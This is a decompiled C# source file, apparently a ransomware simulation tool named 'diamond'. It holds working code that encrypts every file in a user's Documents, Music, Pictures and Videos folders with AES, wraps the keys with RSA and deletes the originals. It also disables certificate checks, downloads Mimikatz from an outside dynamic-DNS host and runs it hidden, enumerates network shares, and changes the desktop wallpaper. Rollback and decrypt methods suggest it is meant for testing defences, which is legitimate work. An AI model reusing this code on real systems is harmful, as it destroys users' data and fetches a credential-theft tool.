using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Microsoft.Win32;

namespace diamond;

internal class TriggerRules
{
	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	private static readonly int MAX_PATH = 260;

	private const uint SPI_GETDESKWALLPAPER = 115u;

	private IniFile MyIni = new IniFile("desktop.ini");

	private Logger logger = new Logger();

	private CspParameters cspp = new CspParameters();

	private RSACryptoServiceProvider rsa;

	private const string keyName = "diamond";

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	public void DynDnsDownload()
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = (object _003Cp0_003E, X509Certificate _003Cp1_003E, X509Chain _003Cp2_003E, SslPolicyErrors _003Cp3_003E) => true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			string text = "https://mimikatz.mooo.com/gentilkiwi/mimikatz/releases/download/2.1.1-20181209/";
			string text2 = "mimikatz_trunk.zip";
			string text3 = ".\\mimikatz";
			string text4 = null;
			if (File.Exists(text2))
			{
				logger.AddtoLogFile("File " + text2 + " exists, deleting first");
				File.Delete(text2);
			}
			if (Directory.Exists(text3))
			{
				logger.AddtoLogFile("Directory " + text3 + " exists, deleting first");
				Directory.Delete(text3, recursive: true);
			}
			logger.AddtoLogFile("Downloading Mimikatz");
			text4 = text + text2;
			WebClient webClient = new WebClient();
			webClient.DownloadFile(text4, text2);
			logger.AddtoLogFile("Unzipping Mimikatz to folder");
			ZipFile.ExtractToDirectory(text2, text3);
			logger.AddtoLogFile("Running Mimikatz");
			Process process = new Process();
			process.StartInfo.FileName = text3 + "\\Win32\\mimikatz.exe";
			process.StartInfo.Arguments = "version exit";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in DynDnsDownload(): " + ex.Message);
		}
	}

	public void ProcessDirectory(string targetDirectory)
	{
		CreatesKey();
		string[] directories = Directory.GetDirectories(targetDirectory);
		for (int i = 0; i < directories.Length; i++)
		{
			if (!directories[i].ToLower().EndsWith("documents") && !directories[i].ToLower().EndsWith("music") && !directories[i].ToLower().EndsWith("pictures") && !directories[i].ToLower().EndsWith("videos"))
			{
				continue;
			}
			foreach (string item in Directory.EnumerateFiles(directories[i], "*.*", SearchOption.AllDirectories))
			{
				ProcessFile(item);
			}
		}
	}

	public void ProcessFile(string originalFile)
	{
		if (!originalFile.Contains(".encrypted") && !File.GetAttributes(originalFile).HasFlag(FileAttributes.Hidden))
		{
			File.Move(originalFile, originalFile + ".encrypted");
			EncryptFile(originalFile + ".encrypted", originalFile + ".encrypt");
			logger.AddtoLogFile("\tEncrypted file: " + Path.GetFileName(originalFile));
		}
	}

	public void ProcessRollback(string targetDirectory)
	{
		CreatesKey();
		string[] files = Directory.GetFiles(targetDirectory);
		string[] array = files;
		foreach (string originalFile in array)
		{
			ProcessFileRollback(originalFile);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		string[] array2 = directories;
		foreach (string targetDirectory2 in array2)
		{
			ProcessRollback(targetDirectory2);
		}
	}

	public void ProcessFileRollback(string originalFile)
	{
		if (originalFile.Contains(".encrypt") && !File.GetAttributes(originalFile).HasFlag(FileAttributes.Hidden))
		{
			string text = originalFile;
			int num = text.LastIndexOf(".");
			if (num > 0)
			{
				text = text.Substring(0, num);
			}
			DecryptFile(originalFile, text);
			logger.AddtoLogFile("\tDecrypted file: " + Path.GetFileName(originalFile));
		}
	}

	private void CreatesKey()
	{
		cspp.KeyContainerName = "diamond";
		cspp.Flags |= CspProviderFlags.UseDefaultKeyContainer;
		rsa = new RSACryptoServiceProvider(cspp)
		{
			PersistKeyInCsp = true
		};
	}

	private void EncryptFile(string inFile, string outFile)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged
		{
			KeySize = 256,
			BlockSize = 256,
			Mode = CipherMode.CBC
		};
		ICryptoTransform transform = rijndaelManaged.CreateEncryptor();
		byte[] array = rsa.Encrypt(rijndaelManaged.Key, fOAEP: false);
		byte[] array2 = new byte[4];
		byte[] array3 = new byte[4];
		int num = array.Length;
		array2 = BitConverter.GetBytes(num);
		int num2 = rijndaelManaged.IV.Length;
		array3 = BitConverter.GetBytes(num2);
		_ = inFile.LastIndexOf("\\") + 1;
		using (FileStream fileStream = new FileStream(outFile, FileMode.Create))
		{
			fileStream.Write(array2, 0, 4);
			fileStream.Write(array3, 0, 4);
			fileStream.Write(array, 0, num);
			fileStream.Write(rijndaelManaged.IV, 0, num2);
			using (CryptoStream cryptoStream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write))
			{
				int num3 = 0;
				int num4 = 0;
				int num5 = rijndaelManaged.BlockSize / 8;
				byte[] buffer = new byte[num5];
				int num6 = 0;
				using (FileStream fileStream2 = new FileStream(inFile, FileMode.Open))
				{
					do
					{
						num3 = fileStream2.Read(buffer, 0, num5);
						num4 += num3;
						cryptoStream.Write(buffer, 0, num3);
						num6 += num5;
					}
					while (num3 > 0);
					fileStream2.Close();
				}
				cryptoStream.FlushFinalBlock();
				cryptoStream.Close();
			}
			fileStream.Close();
		}
		File.Delete(inFile);
	}

	private void DecryptFile(string inFile, string outFile)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged
		{
			KeySize = 256,
			BlockSize = 256,
			Mode = CipherMode.CBC
		};
		byte[] array = new byte[4];
		byte[] array2 = new byte[4];
		using (FileStream fileStream = new FileStream(inFile, FileMode.Open))
		{
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Read(array, 0, 3);
			fileStream.Seek(4L, SeekOrigin.Begin);
			fileStream.Read(array2, 0, 3);
			int num = BitConverter.ToInt32(array, 0);
			int num2 = BitConverter.ToInt32(array2, 0);
			int num3 = num + num2 + 8;
			_ = (int)fileStream.Length - num3;
			byte[] array3 = new byte[num];
			byte[] array4 = new byte[num2];
			fileStream.Seek(8L, SeekOrigin.Begin);
			fileStream.Read(array3, 0, num);
			fileStream.Seek(8 + num, SeekOrigin.Begin);
			fileStream.Read(array4, 0, num2);
			byte[] rgbKey = rsa.Decrypt(array3, fOAEP: false);
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(rgbKey, array4);
			using (FileStream fileStream2 = new FileStream(outFile, FileMode.Create))
			{
				int num4 = 0;
				int num5 = 0;
				int num6 = rijndaelManaged.BlockSize / 8;
				byte[] buffer = new byte[num6];
				fileStream.Seek(num3, SeekOrigin.Begin);
				using (CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write))
				{
					do
					{
						num4 = fileStream.Read(buffer, 0, num6);
						num5 += num4;
						cryptoStream.Write(buffer, 0, num4);
					}
					while (num4 > 0);
					cryptoStream.FlushFinalBlock();
					cryptoStream.Close();
				}
				fileStream2.Close();
			}
			fileStream.Close();
		}
		File.Delete(inFile);
	}

	public void NetUse()
	{
		try
		{
			logger.AddtoLogFile("Started NetUse");
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net use";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in NetUse(): " + ex.Message);
		}
	}

	public void SetDesktop(string input, string style, string tile)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey.SetValue("WallpaperStyle", style);
			registryKey.SetValue("TileWallpaper", tile);
			logger.AddtoLogFile("Current directory: " + Directory.GetCurrentDirectory());
			if (!SystemParametersInfo(20u, 0u, input, 3u))
			{
				logger.AddtoLogFile("Failed to set desktop.");
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in setting desktop " + ex.Message);
		}
	}

	public void SaveDesktop()
	{
		try
		{
			string text = Registry.GetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "Wallpaper", 0)!.ToString();
			string value = Registry.GetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WallpaperStyle", 0)!.ToString();
			string value2 = Registry.GetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "TileWallpaper", 0)!.ToString();
			MyIni.Write("Wallpaper", text, "Desktop");
			MyIni.Write("WallpaperStyle", value, "Desktop");
			MyIni.Write("TileWallpaper", value2, "Desktop");
			logger.AddtoLogFile("Current desktop image: " + text);
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in saving desktop " + ex.Message);
		}
	}

	public void ResetDesktop()
	{
		try
		{
			string text = MyIni.Read("Wallpaper", "Desktop");
			logger.AddtoLogFile("Set to wallpaper: " + text);
			string style = MyIni.Read("WallpaperStyle", "Desktop");
			string tile = MyIni.Read("TileWallpaper", "Desktop");
			SetDesktop(text, style, tile);
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in resetting desktop " + ex.Message);
		}
	}
}
